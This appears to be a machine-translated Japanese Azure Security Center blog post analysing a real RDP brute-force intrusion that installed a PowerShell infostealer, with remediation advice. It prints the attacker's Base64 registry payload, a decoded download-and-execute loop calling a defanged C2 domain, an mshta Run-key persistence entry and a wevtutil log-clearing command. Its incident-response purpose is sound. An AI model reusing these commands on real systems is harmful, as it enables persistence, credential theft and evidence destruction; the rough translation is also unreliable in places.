### YamlMime:Yaml
ms.openlocfilehash: e5507376f130f7bf83059be515c06eab36e5b6bd
ms.sourcegitcommit: d03bdc7fe5447adb6530886aab848b75fe8fa8ee
ms.translationtype: MT
ms.contentlocale: ja-JP
ms.lasthandoff: 03/11/2022
ms.locfileid: "139896756"
Slug: how-azure-security-center-unveils-suspicious-powershell-attack
Title: 疑Azure Security Center PowerShell 攻撃を検出する方法
Summary: National Cybersecurity Awareness Month (NCSAM) にちなみ、このシリーズの新しい投稿では、検出、調査、軽減に役立つ現実世界の攻撃Azure Security Centerを強調しています。 この投稿では、PowerShell を使用して悪意のあるコードを実行し、ユーザーの資格情報を収集した攻撃について説明します。
Content: >-
  <p>National <a href="https://www.dhs.gov/national-cyber-security-awareness-month">Cybersecurity Awareness Month (NCSAM</a> ) にちなみ、このシリーズの新しい投稿では、Azure Security Center が検出、調査、軽減に役立った現実世界の攻撃を強調しています。 この投稿では、PowerShell を使用して悪意のあるコードを実行し、ユーザーの資格情報を収集した攻撃について説明します。 しかし、先に説明する前&rsquo;に、このシリーズの他のブログ記事の要約を示します。この記事Security Center検出されました。</p>


  <ul>
   <li><a href="https://azure.microsoft.com/en-us/blog/how-azure-security-center-helps-reveal-a-cyberattack/">SQL ブルート フォース攻撃</a></li>
   <li><a href="https://azure.microsoft.com/en-us/blog/how-azure-security-center-detects-a-bitcoin-mining-attack/">ビットコインマイニング攻撃</a></li>
   <li><a href="https://azure.microsoft.com/en-us/blog/how-azure-security-center-detects-ddos-attack-using-cyber-threat-intelligence/">サイバー脅威インテリジェンスを使用した DDoS 攻撃</a></li>
   <li><a href="https://azure.microsoft.com/en-us/blog/how-azure-security-center-aids-in-detecting-good-applications-being-used-maliciously/">適切なアプリケーションが悪意を持って使用されている</a></li>
  </ul>


  <p>この投稿では、&rsquo;チームによって検出され、調査された別の興味深い実際のAzure Security Centerシナリオについて説明します。 プライバシーを保護するために、影響を受ける会社の名前、すべてのコンピューター名、およびすべてのユーザー名が変更されました。 この特定の攻撃では、パスワードの盗用、キーストローク ログ、クリップボードのスクレーピング、画面キャプチャを通じて資格情報を収集する目的で、悪意のあるコードをメモリ内で実行するために PowerShell を使用しました。 RDP&rsquo; フォース攻撃から始まり、レジストリ内の永続的な自動開始 (ASEP) のセットアップと構成が発生した侵害のステージをマップします。 このケース スタディでは、攻撃のダイナミックスに関する分析情報と、環境内で同様の攻撃を検出して防止する方法に関する推奨事項を提供します。</p>


  <h2>初期Azure Security Centerアラートと詳細</h2>


  <p>インターネットに接続されたコンピューターのリモート管理が行っている限り、ハッカーはブルート フォース攻撃を通じてパスワードを割り込むよう、リモート デスクトップ プロトコル (RDP) などのリモート管理サービスの実行を検出する取り組みを続けきました。 このケースは、&rsquo;RDP ブルート フォース アクティビティAzure Security Center疑わしい PowerShell アクティビティに対してアラートが送信された大規模な顧客コンソールから始まります。</p>


  <p>次の Azure Security Center &ldquo; のスクリーンショットでは、フェイル<em>化された RDP<em></em></em>&rdquo; &ldquo; ブルート フォース攻撃アラートの後に、ユーザー パスワードを推測した後に RDP 経由でログオンしたユーザーを示す 1 つの成功した <em>RDP</em>&rdquo; &ndash; ブルート フォース攻撃アラートが表示されるので、下から上への時系列の進行を追跡できます。 この悪意のあるブルート フォース ログオンの後に、通常とは異なる PowerShell アクティビティに関するアラートがいくつか表示されます。</p>


  <p><a href="https://azurecomcdn.azureedge.net/mediahandler/acomblog/media/Default/blog/90722730-642a-446c-8230-d06c10fd484b.png"><img alt="image" border="0" height="278" src="https://azurecomcdn.azureedge.net/mediahandler/acomblog/media/Default/blog/ca4160ef-25b1-4d32-b5fa-ad03c873c35a.png" style="border-image: none; padding-top: 0px; padding-right: 0px; padding-left: 0px; margin-right: auto; margin-left: auto; float: none; display: block; background-image: none;" title="イメージ" width="1094"></a></p>


  <p>最初の成功した RDP ブルート フォース攻撃アラートを調べると、攻撃の時間、侵害されたアカウント、試行の発生元の攻撃 IP アドレス (この場合はイタリア)、Microsofts&rsquo; Threat Intel &ldquo;RDP ブルー&rdquo; ト 強制レポートへのリンクが表示されます。</p>


  <p><a href="https://azurecomcdn.azureedge.net/mediahandler/acomblog/media/Default/blog/a81cf2ba-1323-4a80-85bb-58e0f81ce36d.png"><img alt="image" border="0" height="675" src="https://azurecomcdn.azureedge.net/mediahandler/acomblog/media/Default/blog/165a0a97-1132-4de8-a9b5-72414d8dccef.png" style="border-image: none; padding-top: 0px; padding-right: 0px; padding-left: 0px; margin-right: auto; margin-left: auto; float: none; display: block; background-image: none;" title="イメージ" width="441"></a></p>


  <p><br>

  ログオンが成功した後、後続の重大度の高いアラートにドリルダウンすると、Azure Security Center は、攻撃者が正常にログオンした後に起動された各コマンド ラインを時系列で明らかにします。</p>


  <p><a href="https://azurecomcdn.azureedge.net/mediahandler/acomblog/media/Default/blog/0d85bb4a-46ab-4c8c-a284-f756b9c3683e.jpg"><img alt="Alerts_Combined" border="0" height="630" src="https://azurecomcdn.azureedge.net/mediahandler/acomblog/media/Default/blog/fe8a2292-8dd3-46e0-83fb-20660889a49f.jpg" style="border-image: none; padding-top: 0px; padding-right: 0px; padding-left: 0px; margin-right: auto; margin-left: auto; float: none; display: block; background-image: none;" title="Alerts_Combined" width="1024"></a></p>


  <h2>最初の侵害と攻撃者のアクティビティの詳細</h2>


  <p>アラートによって提供される情報を使用して、調査チームは顧客と一緒に、アカウント ログオン ログ (イベント ID 4624) プロセス作成ログ (イベント ID 4688) を調べ、攻撃者が最初にログオンした時間から取得しました。 最も古いログオン データから、さまざまなユーザー名とパスワードの組み合わせを使用した RDP ブルート フォース試行が継続的に行われ、表示されます。 これらの失敗した試行のほとんどでは、イベント <strong>ID 4625</strong> (アカウントのログオンに失敗しました)、状態コード <strong>が 0xc000006d</strong> (ログオン試行は無効)、サブステータス コードが <strong>0xc0000064</strong> (指定されたアカウントが存在しません) になります。</p>


  <p><a href="https://azurecomcdn.azureedge.net/mediahandler/acomblog/media/Default/blog/22c0c0aa-5158-43d6-a7cf-2bf69edb5be4.png"><img alt="image" border="0" height="233" src="https://azurecomcdn.azureedge.net/mediahandler/acomblog/media/Default/blog/7494eaa0-b009-4162-ac94-38ee56b70e79.png" style="border-image: none; padding-top: 0px; padding-right: 0px; padding-left: 0px; margin-right: auto; margin-left: auto; float: none; display: block; background-image: none;" title="イメージ" width="1092"></a></p>


  <p>09-06 の午前 10 時 13 分頃、Substatus コードに変更が表示されます。 これで、ContosoAdmin&rdquo; というユーザー名&ldquo;を使用すると、別の状態コードが表示されます:0xc000006a (間<strong>違</strong>ったパスワード)。 その後、種類が 3 のログオンに成功し、アカウント ContosoAdmin を使用して「10 (Remote Interactive)」と &ldquo;入力します&rdquo;。 ログオンは、イタリアの IP アドレス (<strong>188.125.100.233</strong>) から発生している可能性があります。</p>


  <p><a href="https://azurecomcdn.azureedge.net/mediahandler/acomblog/media/Default/blog/f6abaed4-564a-4989-a7c9-48b3fd0388c3.png"><img alt="image" border="0" height="110" src="https://azurecomcdn.azureedge.net/mediahandler/acomblog/media/Default/blog/19d11aef-d2cc-4a68-8475-2f26df546bce.png" style="border-image: none; padding-top: 0px; padding-right: 0px; padding-left: 0px; margin-right: auto; margin-left: auto; float: none; display: block; background-image: none;" title="イメージ" width="1240"></a></p>


  <p>ログオン後のプロセス作成アクティビティを確認します。 攻撃者はまず whoami &ldquo;<strong>コマンドを発行</strong>&rdquo; し、現在ログオンしているユーザーを表示します。 次に、net グループ &ldquo;Domain Admins /domain コマンドを使用して <strong>Domain Admins &ldquo;グループのメンバー&rdquo;を一覧表示</strong>します。&rdquo; その後に、すべてのセッションを&ldquo;表示する <strong>qwinsta</strong>&rdquo; リモート デスクトップ サービスされます。 Taskmgr (Windows タスク マネージャー) が起動され、プロセスとサービスが表示または管理されます。</p>


  <p><a href="https://azurecomcdn.azureedge.net/mediahandler/acomblog/media/Default/blog/a1267819-cb20-4bc8-b208-f68002c8a43e.png"><img alt="image" border="0" height="152" src="https://azurecomcdn.azureedge.net/mediahandler/acomblog/media/Default/blog/26d3cb9f-f0dc-4f5d-9957-930e4d8ff707.png" style="border-image: none; width: 1375px; height: 130px; padding-top: 0px; padding-right: 0px; padding-left: 0px; margin-right: auto; margin-left: auto; float: none; display: block; background-image: none;" title="image1" width="1398"></a> 分後に、別の PowerShell コマンドが実行されます。 このコマンドは、さらに Deflate 圧縮アルゴリズムでラップされる Base64 でエンコードされた文字列で難読化されます。</p>


  <p>注: この&rsquo;ブログで後ほど Base64 をデコードする場合、このコマンドの動作について詳しく説明します。</p>


  <p><a href="https://azurecomcdn.azureedge.net/mediahandler/acomblog/media/Default/blog/a3633dd4-af2b-4a00-95bc-96a9c09f7e97.png"><img alt="image" border="0" height="262" src="https://azurecomcdn.azureedge.net/mediahandler/acomblog/media/Default/blog/cb43a223-6b11-4331-a832-7535a67e3d75.png" style="border-image: none; padding-top: 0px; padding-right: 0px; padding-left: 0px; margin-right: auto; margin-left: auto; float: none; display: block; background-image: none;" title="イメージ" width="1400"></a></p>


  <p>約 3 分後に、攻撃者はマシンからログオフします。 ただし、ログオフする前に、すべてのイベント ログをクリアしてトラックをクリーンアップします。 これは、組み込みの <strong>wevtutil.exe(Windows </strong> コマンド ライン ユーティリティ) を使用して行います。 最初に、すべてのイベント ログが el&rdquo; &ldquo;または &ldquo;enum-logs スイッチで列挙&rdquo;されます。 その後、cl スイッチまたは &ldquo;clear-log&rdquo; スイッチを使用して、すべての &ldquo;イベント ログがクリア&rdquo; されます。 攻撃者によって起動されたイベントクリア コマンドの一部を次に示します。</p>


  <p><a href="https://azurecomcdn.azureedge.net/mediahandler/acomblog/media/Default/blog/f63fb0ec-2183-48ba-88e8-16e4a29f07bc.png"><img alt="image" border="0" height="462" src="https://azurecomcdn.azureedge.net/mediahandler/acomblog/media/Default/blog/77629ebd-7e6b-48b0-a403-034fc8faadfb.png" style="border-image: none; padding-top: 0px; padding-right: 0px; padding-left: 0px; margin-right: auto; margin-left: auto; float: none; display: block; background-image: none;" title="イメージ" width="1401"></a></p>


  <h2>Base64 でエンコードされた PowerShell コマンドを詳しく見る</h2>


  <p>攻撃者の初期コマンドからエンコードされた Base64&rsquo; 部分をデコードすると、さらに多くの Base64 でエンコードされたコマンドが表示されます。</p>


  <ul>
   <li>入れ子になった Base64 難読化。</li>
   <li>コマンド実行のすべてのレベルは難読化されます。</li>
   <li>永続化メカニズムとしてレジストリ専用 ASEP (自動開始機能拡張ポイント) で作成されます。</li>
   <li>レジストリに格納されている悪意のあるコード パラメーター。</li>
   <li>ASEP と&ldquo;&rdquo;パラメーターはシステム レジストリ内のみにあるので、コマンドの実行はファイルまたは NTFS 成果物を含めずにメモリ内で実行されます。</li>
  </ul>


  <p>攻撃者&rsquo;によって発行された最初のコマンドを次に示します。</p>


  <p><a href="https://azurecomcdn.azureedge.net/mediahandler/acomblog/media/Default/blog/9c8d6e69-4fd0-40b0-af7b-f4a1a2694bba.png"><img alt="image" border="0" height="263" src="https://azurecomcdn.azureedge.net/mediahandler/acomblog/media/Default/blog/8b8819f8-48be-4986-a0b4-67a5059bf966.png" style="border-image: none; padding-top: 0px; padding-right: 0px; padding-left: 0px; margin-right: auto; margin-left: auto; float: none; display: block; background-image: none;" title="イメージ" width="943"></a><br>

  <a href="https://azurecomcdn.azureedge.net/mediahandler/acomblog/media/Default/blog/4278a65f-96cf-4287-ad4e-716ca83915e6.png"><img alt="image" border="0" height="84" src="https://azurecomcdn.azureedge.net/mediahandler/acomblog/media/Default/blog/66836ec7-871f-401d-bfc0-6a4f86ad3ca8.png" style="border-image: none; padding-top: 0px; padding-right: 0px; padding-left: 0px; margin-right: auto; margin-left: auto; float: none; display: block; background-image: none;" title="イメージ" width="54"></a></p>


  <p align="center">Base64 をデコードすると、レジストリ エントリとデコードするより多くの Base64 文字列が表示されます&hellip;</p>


  <p align="center"><a href="https://azurecomcdn.azureedge.net/mediahandler/acomblog/media/Default/blog/4c87cb2a-abd5-43c2-a655-351ef4b5bb81.png"><img alt="image" border="0" height="208" src="https://azurecomcdn.azureedge.net/mediahandler/acomblog/media/Default/blog/37059866-c34a-4a15-b765-7f413dc427cc.png" style="border-image: none; padding-top: 0px; padding-right: 0px; padding-left: 0px; display: inline; background-image: none;" title="イメージ" width="949"></a></p>


  <p align="center"><a href="https://azurecomcdn.azureedge.net/mediahandler/acomblog/media/Default/blog/a9837031-794b-4d2b-8921-603dc3e7a0ab.png"><img alt="image" border="0" height="84" src="https://azurecomcdn.azureedge.net/mediahandler/acomblog/media/Default/blog/9cb8d705-05ee-4d37-8d65-6c2d6ea6a6f6.png" style="margin: 0px; border-image: none; padding-top: 0px; padding-right: 0px; padding-left: 0px; display: inline; background-image: none;" title="イメージ" width="54"></a></p>


  <p>これらの入れ子になった Base64 の値をデコードすると、コマンドで次の処理が行われと判断されます。</p>


  <ul>
   <li>このコマンドは、&ldquo;最初に、以降のコマンドから読み取るパラメーター情報を、HKLM\Software\Microsoft\Windows\CurrentVersion の下の SeCert&rdquo; という名前のレジストリの場所に格納します。</li>
  </ul>


  <pre class="prettyprint">

  [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion]

  &quot;SeCert&quot;=&quot;dwBoAGkAbABlACgAMQApAHsAdAByAHkAewBJAEUAWAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALg

  BEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AbQBkAG0AcwBlAHIAdgBlAHIAcwAuAGMAbwBtAC8AJwArACgAWwBjAGgAYQBy

  AF0AKAA4ADUALQAoAC0AMwA3ACkAKQApACkAfQBjAGEAdABjAGgAewBTAHQAYQByAHQALQBTAGwAZQBlAHAAIAAtAHMAIAAxADAAfQB9AA==&quot;

  </pre>


  <ul>
   <li>上記のレジストリ キーの Base64 値は、悪意のある C2 (Command and Control) ドメイン (<strong>mdmservers) からダウンロード コマンドにデコードされます。com)。</strong></li>
  </ul>


  <pre class="prettyprint">

  while(1){try{IEX(New-Object Net.WebClient).DownloadString(&#39;hxxp[:]//mdmservers[.]com/&#39;+([char](85-(-37))))}catch{Start-Sleep -s 10}}</pre>


  <ul>
   <li>&rsquo;次に、攻撃者コマンドは、HKLM\Software\Microsoft\Windows\CurrentVersion\Run&rdquo; キーの下に、SophosMSHTA&ldquo; &ldquo;という名前のレジストリ ASEP (自動開始機能拡張ポイント) &rdquo;を介して永続化メカニズムを作成します。</li>
  </ul>


  <pre class="prettyprint">

  [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run]

  &quot;SophosMSHTA&quot;=&quot;mshta vbscript:CreateObject(\&quot;Wscript.Shell\&quot;).Run(\&quot;powershell.exe -c \&quot;\&quot;$x=$((gp HKLM:Software\\Microsoft\\Windows\\CurrentVersion SeCert).SeCert);powershell -E $x\&quot;\&quot;\&quot;,0,True)(window.close)&quot;</pre>


  <ul>
   <li>このレジストリの永続化により、マシンが起動または再起動されるたび、悪意のあるコマンドが起動されます。</li>
   <li>レジストリ ASEP は、Microsoft スクリプト エンジン (mshta.exe) を起動します。</li>
   <li>Mshta.exe次に、 は PowerShell.exe を実行し、HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion -&gt; &rdquo;SeCert&rdquo; の値を読み取ってデコードします。</li>
   <li>SeCert のレジストリ値は、悪意のあるスクリプトをダウンロードして、&#39;xp[:]//mdmservers から起動する powerShell に指示しますcom。&rsquo;</li>
  </ul>


  <h2>ダウンロードおよび実行された悪意のあるコード</h2>


  <p>攻撃者が永続化メカニズムを設定し、ログオフすると、ホスト マシンの次の再起動によって PowerShell が起動され、&#39;xpxp[:]//mdmservers から悪意のあるペイロードがダウンロードされ、起動されます。com&#39;。 この悪意のあるスクリプトには、特定の機能を実行するさまざまなセクションが含まれています。 次の表は、悪意のあるペイロードの主な機能の詳細を示しています。</p>


  <table border="0" cellpadding="2" cellspacing="0" width="1191">
   <tbody>
    <tr>
     <td valign="top" width="1189">アクション</td>
    </tr>
    <tr>
     <td valign="top" width="1189">
     <p>クリップボードからコンテンツをスクレーピングし、出力を次の場所に保存します。</p>

     <p align="center"><em>%temp%\Applnsights_VisualStudio.txt</em></p>
     </td>
    </tr>
    <tr>
     <td valign="top" width="1189">
     <p>次の場所へのすべてのキーストロークをキャプチャします。</p>

     <p align="center"><em>%temp%\key.log</em></p>
     </td>
    </tr>
    <tr>
     <td valign="top" width="1189">
     <p>最初の画面キャプチャを受け取り、.jpgを次の場所に保存します。</p>

     <p align="center"><em>%temp%\39F28DD9-0677-4EAC-91B8-2112B1515341\yyyymmdd_hhmmss.jpg</em></p>
     </td>
    </tr>
    <tr>
     <td valign="top" width="1189">
     <p>特定の財務またはアカウントの資格情報に関連するキー ワードが入力された場合に後続の画面キャプチャを受け取り、.jpgに保存します。</p>

     <p align="center"><em>%temp%\39F28DD9-0677-4EAC-91B8-2112B1515341\yyyymmdd_hhmmss.jpg</em></p>
     </td>
    </tr>
    <tr>
     <td valign="top" width="1189">
     <p>Google Chrome ブラウザーがインストールされていることを確認します。 その場合、 は Chrome キャッシュからすべてのパスワードを収集し、次の場所に保存します。</p>

     <p align="center"><em>%temp%\Chrome.log</em></p>
     </td>
    </tr>
    <tr>
     <td valign="top" width="1189">
     <p>Mozilla Firefox ブラウザーがインストールされていることを確認します。 その場合、 は Firefox キャッシュからすべてのパスワードを収集し、次の場所に保存します。</p>

     <p align="center"><em>%temp%\Firefox.log</em></p>
     </td>
    </tr>
   </tbody>
  </table>


  <h2>まとめ</h2>


  <p>そこで、この&rsquo;調査でこれまでに見&rsquo;た内容を要約します。</p>


  <ol>
   <li>初期イングレスは、RDP ブルート フォース攻撃が成功した場合に管理者アカウントが侵害された場合に発生します。</li>
   <li>その後、攻撃者は Base64 難読化された PowerShell コマンドを実行し、起動時に起動するレジストリ ASEP を設定します。</li>
   <li>攻撃者は、次のコマンドを使用してすべてのイベント ログを削除することで、アクティビティの証拠をクリアします:&nbsp; wevtutil.exe -cl &lt;eventlogname&gt;。</li>
   <li>影響を受けるホストが起動または再起動すると、HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run で悪意のあるレジストリ ASEP が起動されます</li>
   <li>レジストリ ASEP は、Microsoft スクリプト エンジン (mshta.exe) を起動します。</li>
   <li>Mshta.exe次に、 は PowerShell.exe を実行し、HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion -&gt; &rdquo;SeCert の値を読み取ってデコードします。&rdquo;</li>
   <li>SeCert&rdquo; のレジストリ&ldquo;値は、悪意のあるスクリプトをダウンロードして起動&#39;xpxp[:]//mdmservers から PowerShell に伝えるCom&rsquo;</li>
   <li>Hxxp [:]//mdmservers [.] からの悪意のあるコードcom は次のことを行います。
   <ul>
    <li>クリップボードの内容を Scrapes:% temp% \Applnsights_VisualStudio.txt</li>
    <li>すべてのキーストロークをキャプチャします:%temp%\key.log</li>
    <li>最初の画面キャプチャを取得し、.jpg を% temp% \39F28DD9-0677-4EAC-91B8-2112B1515341\yyyymmdd_hhmmss.jpg に保存します</li>
    <li>は、特定の財務またはアカウントの資格情報に関連するキーワードが入力されたときに後続の画面キャプチャを実行し、.jpg を次の場所に保存します:% temp% \39F28DD9-0677-4EAC-91B8-2112B1515341\yyyymmdd_hhmmss.jpg</li>
    <li>Google Chrome ブラウザーがインストールされているかどうかを確認します。 その場合、Chrome キャッシュからすべてのパスワードを収集し、:%temp%\Chrome.log に保存します。</li>
    <li>Mozilla Firefox ブラウザーがインストールされているかどうかを確認します。 その場合は、Firefox cache からすべてのパスワードを収集し、:%temp%\Firefox.log に保存します。</li>
   </ul>
   </li>
  </ol>


  <p>この攻撃の結果として、レジストリから自動的に起動され、メモリ内で実行され、キーストローク、ブラウザーパスワード、クリップボードデータ、スクリーンショットが収集される、マルウェアを盗む情報が得られます。</p>


  <h2>すべてをキャッチ Azure Security Center 方法</h2>


  <p>攻撃者は、アクティビティを隠すために特別な手段を使用していたことが明らかです。すべてのプロセスの実行で、組み込みの Windows 実行可能ファイル (PowerShell.exe、Mshta.exe、Wevtutil.exe) を使用して、難読化およびレジストリに格納されたコマンドパラメーターを使用し、すべてのイベントログを削除してそれらのトラックを消去します。 ただし、このような作業によって、Azure Security Center がこの悪意のあるアクティビティを検出、収集、および報告できなくなることはありませんでした。</p>


  <p>このブログの冒頭で説明したように、Azure Security Center この攻撃のすべての段階が検出されたため、初期 RDP ブルートフォース攻撃の詳細を提供し、攻撃者によって発行されたさまざまな段階ですべてのコマンドを表示します。 &rsquo;また、アラートでは、難読化されたすべてのコマンドラインが解読され、デコードされて、攻撃の各段階でクリアテキストで表示されていることがわかります。 この情報を保存することによって、セキュリティ対応の調査担当者やシステム管理者は、何が起こっ &rdquo; たかなどの質問 &ldquo; に答えること &ldquo; &nbsp; &ldquo; &rdquo; &rsquo; &rdquo; &rdquo; ができます。これは、どのような場合 &ldquo; &rdquo; に発生したのでしょうか。 &ldquo;また、調査担当者は、組織内の他のホストが、侵害されたこのホストからの横方向の移動によって侵害されたかどうかを判断することもできます。 この攻撃の全体像を確認することは、な目的のような質問 &ldquo; に答えるのにも役立ちます。 &rdquo; ここでは、主な目的は、財務または知的利益の目標に対する資格情報の盗用であると思われます。</p>


  <p>すべての調査で、Azure Security Center は、初期の受信/侵害ベクター、攻撃元、可能な水平方向の移動、攻撃の範囲などの重要な詳細を特定するのに役立つ、非常に重要な役割を果たしています。 また、は、ファイルシステムの上書きやログのリテンション/ストレージの制限により、時間の経過と共に失われる可能性のあるアイテムの詳細も Security Center します。 最新の機械学習と大規模な Data Analytics を使用してさまざまなソースからのデータを取り込み、格納、分析、および解読する機能を Azure Security Center &rsquo; 、セキュリティアナリスト、インシデントレスポンダー、およびフォレンジック専門家にとって非常に重要になります。</p>


  <h2>推奨される修復手順と軽減策</h2>


  <p>最初のセキュリティ侵害は、簡単に推測できるパスワードを持つユーザーアカウントで、RDP ブルートフォース攻撃が成功した結果でした。 これにより、影響を受けるホストコンピューターが完全に侵害されます。 この場合、ホストは、財務や知的財産権の目標を使用して資格情報を盗むことを主な目的として、悪意のある PowerShell コードで構成されていました。 Microsoft では、使用可能なログソース、ホストベースの分析、および必要に応じて、侵害の画像を構築するために必要な場合に備えて、最初のセキュリティ侵害の原因を調査することをお勧めします。 Azure Infrastructure as a Service (IaaS) と Virtual Machines (Vm) の場合は、実行中のマシンおよびディスクイメージング機能にデータドライブをアタッチする機能など、データの収集を容易にするための機能がいくつかあります。 また、マルウェア対策ソフトウェアを使用してスキャンを実行し、ホストで実行されている悪意のあるソフトウェアを特定して削除することをお勧めします。 侵害されたホストから横移動が特定されている場合、修復アクションはこれらのホストに拡張する必要があります。</p>


  <p>対象となるホストがクリーンであることを確認できない場合、または侵害の根本原因を特定できない場合は、重要なデータをバックアップし、新しいバーチャルマシンに移行することをお勧めします。 また、reinfection を防ぐために、新しいホストまたは修復されたホストは、ネットワーク上に戻される前に強化する必要があります。 ただし、これはすぐには実行できないことを理解しているため、次の修復/予防手順を実装することをお勧めします。</p>


  <ul>
   <li><strong>パスワードポリシー</strong>: 通常、攻撃者は、ワードワードとスマートルールセットを利用して、ユーザーのパスワードをインテリジェントかつ自動的に推測する、広く利用可能なツールを使用してブルートフォース攻撃を仕掛けます。 そのため、最初の手順として、すべての Vm に対して複雑なパスワードを使用するようにします。 パスワードの頻繁な変更を実施する複雑なパスワードポリシーを設定する必要があります。 <a href="https://technet.microsoft.com/en-us/library/ff741764.aspx">パスワードポリシーを適用するためのベストプラクティス</a>について説明します。</li>
   <li><strong>エンドポイント</strong>: エンドポイントは、インターネットから VM と通信できるようにします。 Azure 環境で VM を作成すると、VM、リモートデスクトップ、および PowerShell を管理するために、既定で2つのエンドポイントが作成されます。 不要なエンドポイントを削除し、必要な場合にのみ追加することをお勧めします。 エンドポイントが開いている場合は、可能な限り使用するパブリックポートを変更することをお勧めします。 新しい Windows VM を作成するとき、既定では、リモートデスクトップのパブリックポートは [自動 &rdquo; ] に &ldquo; 設定されます。これは、ランダムなパブリックポートが自動的に生成されることを意味します。 <a href="https://docs.microsoft.com/en-us/azure/virtual-machines/windows/classic/setup-endpoints">Azure の従来の Windows 仮想マシンでエンドポイントを設定する方法</a>の詳細については、こちらを参照してください。</li>
   <li><strong>ネットワークセキュリティグループを有効</strong>にする Azure Security Center: ネットワークセキュリティグループ (nsg) が有効になっていない場合 &rsquo; は、有効にすることをお勧めします。 NSG には、Virtual Network 内の VM インスタンスへのネットワーク トラフィックを許可または拒否するアクセス制御リスト (ACL) 規則の一覧が含まれています。 エンドポイント ACL を使用すると、アドレスの IP アドレスまたは CIDR サブネットを制御し、その管理プロトコルでのアクセスを許可することができます。 ネットワーク <a href="https://docs.microsoft.com/en-us/azure/virtual-network/virtual-networks-nsg">セキュリティグループを使用してネットワークトラフィックをフィルター処理</a> し、 <a href="https://docs.microsoft.com/en-us/azure/security-center/security-center-enable-network-security-groups">ネットワークセキュリティグループを有効</a>にする方法の詳細については、Azure Security Center を参照してください。</li>
   <li><strong>管理に Vpn を使用</strong>する: vpn ゲートウェイは、パブリック接続経由でオンプレミスの場所に暗号化されたトラフィックを送信する仮想ネットワークゲートウェイの一種です。 VPN ゲートウェイを使用すると、Microsoft ネットワークを経由して Azure 仮想ネットワーク間で暗号化されたトラフィックを送信することもできます。 Azure 仮想ネットワークとオンプレミスサイトの間で暗号化されたネットワークトラフィックを送信するには、仮想ネットワーク用の VPN ゲートウェイを作成する必要があります。 <a href="https://docs.microsoft.com/en-us/azure/vpn-gateway/vpn-gateway-about-vpngateways#site-to-site-and-multi-site-ipsecike-vpn-tunnel">サイト</a>間接続と<a href="https://docs.microsoft.com/en-us/azure/vpn-gateway/vpn-gateway-about-vpngateways#a-namep2sapoint-to-site-vpn-over-sstp">ポイント対サイト</a>ゲートウェイ接続の両方で、パブリックエンドポイントを完全に削除し、セキュリティで保護された VPN 接続を介して仮想マシンに直接接続することができます。</li>
   <li><strong>ネットワークレベル認証 (nla)</strong>: nla をホストコンピューターで使用して、ドメイン認証済みユーザーからのリモートデスクトップセッションの作成のみを許可することができます。 NLA では、サーバーとのセッションが確立される前に、接続ユーザーが自身を認証する必要があるため、ブルートフォース、辞書攻撃、パスワード推測攻撃が軽減されます。</li>
   <li><strong>ジャストインタイム (JIT) ネットワークアクセス</strong>: Azure Security Center でのジャストインタイム仮想マシン (VM) アクセスを使用して、Azure vm への受信トラフィックをセキュリティで保護し、ロックダウンすることができます。 JIT ネットワークアクセスを使用すると、ポートが開いている時間を制限することでブルートフォース攻撃への露出を減らすことができます。また、必要に応じて簡単に Vm に接続できるようになります。&nbsp;</li>
  </ul>


  <h2>リソース</h2>


  <p>Powershell チームは、PowerShell を使用して、セキュリティに透過的なスクリプト言語とシェルを提供してきました。 次のリンクでは、PowerShell の問題を解決する方法について詳しく説明しています。</p>


  <ul>
   <li><a href="https://blogs.msdn.microsoft.com/powershell/2015/06/09/powershell-the-blue-team/">https://blogs.msdn.microsoft.com/powershell/2015/06/09/powershell-the-blue-team/</a></li>
   <li><a href="https://www.youtube.com/watch?v=ZkJ64_tQxPU">https://www.youtube.com/watch?v=ZkJ64_tQxPU</a></li>
   <li><a href="https://twitter.com/Lee_Holmes/status/922462821081694208" title="https://twitter.com/Lee_Holmes/status/922462821081694208">https://twitter.com/Lee_Holmes/status/922462821081694208</a></li>
   <li><a href="https://blogs.msdn.microsoft.com/powershell/2017/10/23/defending-against-powershell-attacks/" title="https://blogs.msdn.microsoft.com/powershell/2017/10/23/defending-against-powershell-attacks/">https://blogs.msdn.microsoft.com/powershell/2017/10/23/defending-against-powershell-attacks/</a></li>
  </ul>


  <p>悪意のあるスクリプトとその出力の詳細については、次を参照してください。</p>


  <ul>
   <li><a href="https://pastebin.com/7wyupkjl">最も興味深い PowerShell トロイの木馬 [PowerShell サンプルと未加工の貼り付けデータによって @JohnLaTwC 提供されます]</a></li>
   <li><a href="https://www.microsoft.com/en-us/wdsi/threats/malware-encyclopedia-description?Name=Spyware%3aPowerShell%2fTripelog">Windows Defender マルウェア百科事典のエントリ: スパイウェア: PowerShell/tripelog</a></li>
  </ul>


  <p>Azure Security Center の詳細については、以下を参照してください。</p>


  <ul>
   <li><a href="https://docs.microsoft.com/en-us/azure/security-center/security-center-detection-capabilities">Azure Security Center &rsquo; の検出機能</a></li>
   <li><a href="https://docs.microsoft.com/en-us/azure/security-center/security-center-managing-and-responding-alerts">Azure セキュリティ センターでのセキュリティの警告の管理と対応</a></li>
   <li><a href="https://docs.microsoft.com/en-us/azure/security-center/security-center-recommendations">Azure Security Center でのセキュリティに関する推奨事項の管理</a></li>
   <li><a href="https://docs.microsoft.com/en-us/azure/security-center/security-center-monitoring">Azure Security Center でのセキュリティ ヘルスの監視</a></li>
   <li><a href="https://docs.microsoft.com/en-us/azure/security-center/security-center-partner-solutions">Azure Security Center を使用したパートナーソリューションの監視</a></li>
   <li><a href="https://docs.microsoft.com/en-us/azure/security-center/security-center-faq">Azure Security Center のよく寄せられる質問 (FAQ)</a>。</li>
   <li>Azure security の <a href="https://blogs.msdn.com/b/azuresecurity/">ブログ</a>を参照して、azure のセキュリティに関する最新のニュースと情報を入手してください。</li>
  </ul>
